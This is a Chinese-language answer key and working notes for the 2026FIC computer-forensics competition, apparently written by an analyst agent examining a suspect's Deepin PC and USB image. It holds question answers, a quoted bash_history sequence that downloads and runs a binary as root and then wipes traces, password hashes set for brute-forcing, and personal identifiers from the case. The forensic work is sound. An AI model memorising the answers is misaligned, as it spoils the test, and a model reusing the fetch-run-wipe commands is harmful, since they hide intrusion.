# 2026FIC 计算机取证 — 最终答案表 (v3 final)

> 角色：computer_analyst (lha-PC, 检材 1, Deepin 23.1)
> 更新时间：2026-05-07 21:50
> 状态：**检材1+检材4-U盘 全盘穷尽**；Hub 联动完毕（11 条 finding F-C001~F-C011 已 POST，5 个跨角色问题待回应）；交接给 stego_crypto 的 Q10 暴破方案已就绪
> 已完成：Q1/Q2/Q3/Q5/Q6/Q9 (6/10 高置信)
> 待证：Q4 (mobile 应答 Q002 后定)
> 跨角色：Q7 (apiKey → server)、Q8 (ransom → server/mobile)、Q10 (vc 密码 → stego_crypto 暴破)

---

## 答案表

| # | 题目 | 答案 | 置信度 | 证据位置 |
|---|---|---|---|---|
| **1** | OS 版本 | `23.1` | 🟢 高 | `/mnt/pc_root/etc/os-release` PRETTY_NAME=Deepin 23.1 |
| **2** | 钓鱼邮件发件人邮箱 | `hf13338261292@outlook.com` | 🟢 高 | deepin-mail uuid `d46d81a9-6100-4998-8f44-b0ec773b790c` From=hf13338261292@outlook.com Subject="Token 限时免费领" 2026-04-14 14:08；lha 已回复(uuid `42e7eeb9`); 第二关联 z07752443452@hotmail.com (4-17 转发推广设计图) |
| **3** | 黄金换现金商家联系方式 | `13612817854` (张总) | 🟢 高 | `~/.local/share/deepin/deepin-voice-note/deepin-voice-note1.0.db` 表 vnote_items_tbl note_id=1 创建于 2026-04-17 10:17:25.595；便签文本: "黄 金 换 现 金 / 张总 / 136 1281 7854" |
| **4** | 推广设计图 APK 下载链接 | `https://dl.sp-live88.com/update/latest.apk` | 🟡 中-高 | mobile_analyst F-M012: HotClub APK config.dat AES-128-ECB-PKCS5 解出 update_url；sp-live88 是 lha 涉黄网站 (server F-S007 MacCMS v10 + mobile F-M009/Q12 + nginx access.log)；PC 推广图 RSA-1024 加密未解 (376 KB, n=1024-bit, e=65537, 私钥不在任何检材), 但链接通过 APK 端交叉验证 |
| **5** | clash-verge 代理端口 | `9527` | 🟢 高 | `~/.local/share/io.github.clash-verge-rev.clash-verge-rev/config.yaml` mixed-port=9527; verge.yaml PAC 指向 mixed-port |
| **6** | AI 软件当前模型类型 | `minimax/minimax-m2.5:free` | 🟢 高 | 浏览器 history 完整时间线: 2026-04-13 16:44 调 `ark.cn-beijing.volces.com/api/v3/chat/completions` 失败 (404) → 04-14 04:59 注册 OpenRouter → 13:00 verify → 13:01:01 创建 API key (`/workspaces/default/keys?utm_source=signup-success`) → 13:02:18 搜 `q=free` 模型 → **13:02:27 选 `openrouter.ai/minimax/minimax-m2.5:free`** → 14:30:37 重访 keys 页面。Trae 邮件 4-15 收到但 Trae 桌面客户端**未安装**（无 deb/AppImage/.config 目录） |
| **7** | AI 模型 apiKey | ❌ 检材1 全盘穷尽不存在 → server | — | 已搜尽: 浏览器 IndexedDB/Local Storage/Session Storage/Service Workers/Cache (sk-or-v1- / sk- 全无命中)、邮件 deepin-mail 17封 .eml + Foxmail 空配置、WPS 文档、bash_history 无 echo、配置 .json/.yml/.toml grep api_key 全空。lha 在 OpenRouter web 创建 key 后未保存本地，可能写到 server 配置 .env / docker-compose 中。已发 finding F-C008 转 server_analyst |
| **8** | 勒索软件解密联系方式 | ❌ 检材1 无勒索本体 → server/mobile | — | lha bash_history 完整链: `curl -O github.com/z583985166/0.0.0/releases/download/1.0.0/get_token_linux` → `chmod 777` → `./get_token_linux` (root) → `rm -rf get_token_linux` → 三次 `rm -rf ~/.cache/*` 反取证。PC 无勒索壁纸/README/邮件赎金主题/桌面 .ransom。便签2 "视频网站技术 uuutalk" 是 lha 找搭网站的技术员（不是勒索者）。get_token_linux 是 lha 主动下载的 token 工具（攻击工具/RAT），但勒索软件本体应在 server 检材或 mobile uuuim 聊天中 |
| **9** | 保险柜编号 | ❌ 必须解密 vc 容器后查内层 VHD | — | 检材4-U盘.E01 (118.9MB) 仅 3 文件: vc(10MB AES-128 加密容器, entropy=7.99 高随机, 非VHD/VHDX magic), SampleVC.exe(123KB GUI 加载器, VirtDisk.dll API), SystemVolumeInfo. **binary F-B003 反编译流程: password→MD5→strncmp 硬编码期望值→AES-128 解密 vc→VHD**. 期望 MD5=`afb977ac242ad60cf46124ad72ca5149`. mobile F-M015 todo "买一个u盘存账单" 表明 vc 是账单容器, 保险柜编号在解密 VHD 后的账单文件里 |
| **10** | 保险柜密码 | ❌ 双 hash 约束 → 转 stego_crypto 暴破 | — | 双 hash 约束: MD5(P)=`afb977ac242ad60cf46124ad72ca5149` (binary F-B003) AND SHA1(P)=`3e627d9046481366eef9c89183f87004968363d9` (mobile F-M014 小米便签). \|P\|=16 ASCII. 已测: 146 智能候选 + raw bytes/hex[:16]/双 MD5/SHA256[:16]/SHA1[:16] 派生 key + 多种 AES 模式 = 全失败. 在线 hash db (nitrxgen/hashes.com/hashtoolkit) 全无命中 → 定制密码. lha PC 全盘明文不存在 (F-C001 已确认). 暴破方案见 `D:\2026FIC\artifacts\stego_crypto_handoff.md` |

---

## 关键线索矩阵

| 资产 | 状态 | 备注 |
|---|---|---|
| `Downloads/推广设计图.png.enc` (376 KB) | RSA-1024 分块加密 (块 128B 密文/120B 明文 ≈ 2940 块) | 需 (n, d) — n 已知 e=65537, 私钥不在任何检材 |
| `Downloads/public.txt` (315 B) | RSA 公钥 n,e | 由 z07752443452@hotmail.com (lha 设计师) 4-17 17:31 发送 |
| `Downloads/加密图片查看.html` (6.3 KB) | 解密器 BigInt modPow, 注释 `<author>https://gitlab.com/z583985166/sec-file</author>` | 同一作者 z583985166: GitHub `0.0.0` 提供 get_token_linux + GitLab sec-file 提供解密器 |
| `tool/get_token_linux` (已删) | bash_history 04-15 下载并 root 执行后立即 `rm -rf` | 反取证, 4-15 之后大量 `rm -rf ~/.cache/*` |
| `tool/VeraCrypt-1.26.24` AppImage | 已下载但 vc 容器**不是** VeraCrypt — 是 SampleVC 自定义 | 误导性资产 |
| `tool/execelcrypt.txt` | WPS 宏字符串→Shape 点阵 (隐写) | 与 wakuang.wps 可能配合 — 但 wakuang.wps OLE 无密码内容 |
| `Documents/wakuang.wps` (32 KB) | WPS OLE, author=lh, 矿机参数表 (8 页), 创建 4-16 11:39 | 无 16 字符密码字符串 |
| `.config/Bob/` | Handshake 区块链钱包 HSD (port 12037) | 与 Q9/Q10 不直接相关 — 04-17 11:29 才下载 |
| `Downloads/SunloginClient_15.2.0.63064_amd64.deb` | 04-13 16:36 下载向日葵远控 | shell.log 多次启动但连接 oray 全部失败 (net error) |
| Foxmail (`com.foxmail.deepin`) Storage | 空盒子 (lihongan1985@outlook.com all.box=64 字节占位) | lha 装了但没同步任何邮件 |
| 浏览器 deepin-browser Default | OpenRouter / Sunlogin / 2026fic.forensix Login Data | 无 sk- key 保存 |
| firefox-zh `3uoi3pm8.default-release` | formhistory 仅 1 条 'www.2026fic.forensix' | 几乎未使用 |

## 攻击者画像

- **李安弘 (lha)** uid=1000, 主机 `lha-PC`, 主邮箱 `lihongan19851024@163.com`, 二邮箱 `lihongan1985@outlook.com` (Foxmail), 出生 1985-10-24, 手机 18691830115
- **第二用户 lah** (uid 1001, gecos "lianhong") — 关联身份/小号
- 用 clash-verge:9527 翻墙
- 注册 OpenRouter 选 minimax/minimax-m2.5:free（先试火山方舟 ARK 失败 404）
- 04-15 下载并 root 执行 `get_token_linux` 后反取证
- 装 Bob Wallet (Handshake)、Foxmail、WPS、VeraCrypt AppImage、Sunlogin
- 设计师 = z07752443452@hotmail.com (Foxmail 7.2.25.432) — 同人为 z583985166 (GitHub `0.0.0` + GitLab `sec-file` 同账号)
- 收到钓鱼邮件 hf13338261292@outlook.com (Token 限时免费领) 已回复 (上钩)
- 黄金换现金商家：张总 13612817854 (4-17 10:17 记便签)
- 4-17 是最后使用日期 (recently-used.xbel + .desktop 启动)

## 跨角色协作记录

### 我已 POST 到 Hub 的 findings (11 条)

| ID | 类型 | 摘要 |
|---|---|---|
| F-C001 | answer | [Q005 答案] vc 16-char ASCII 密码在 lha PC 不存在 |
| F-C002 | answer | Q1 = Deepin 23.1 |
| F-C003 | answer | Q2 = hf13338261292@outlook.com |
| F-C004 | answer | Q3 = 13612817854 (张总) |
| F-C005 | answer | Q4 候选 = https://dl.sp-live88.com/update/latest.apk |
| F-C006 | answer | Q5 = 9527 |
| F-C007 | answer | Q6 = minimax/minimax-m2.5:free |
| F-C008 | blocker | Q7 apiKey 不在 PC, 转 server |
| F-C009 | evidence | Q8 关键链路: get_token_linux + 反取证 |
| F-C010 | answer | Q9 = U盘 vc 容器 |
| F-C011 | blocker | Q10 vc 16-char 双 hash 暴破准备 |

### 我向其他角色提的问题 (待回复)

| ID | to | 问题概要 |
|---|---|---|
| Q001 | binary | vc KDF 详细 (实际 AES key 派生?) |
| Q002 | mobile | Q4 update_url 是否就是推广图扫码链接? |
| Q003 | binary | AES key 是否 password 直接 = 16 字节, IV 来源? Frida hook? |

### 已使用的 mobile/server/binary findings (29 条)

- 关键: F-B003 (vc MD5), F-M014 (vc SHA1), F-M012 (HotClub APK update_url), F-M015 (todo 买u盘存账单), F-S006 (ngrok blemish-junior), F-S007 (MacCMS v10), F-S008 (admin1.php), F-M022 (备用域名 backup.sp-live88.xyz:8443)

## 已穷尽未果的搜索

- ngrok 域名 `blemish-junior-unengaged.ngrok-free.dev` — lha PC 浏览器/邮件/家目录全无访问痕迹 ✓
- sp-live88 任意子域名 — 浏览器 history/Cache/邮件 全无访问痕迹 ✓
- private.txt RSA 私钥 — 检材1+检材4 全盘搜 PEM/DER/p、q、d 标记全无 ✓
- 桌面壁纸/README 勒索信 — 桌面仅 7 个 .desktop 文件, Pictures 空, 无勒索特征 ✓
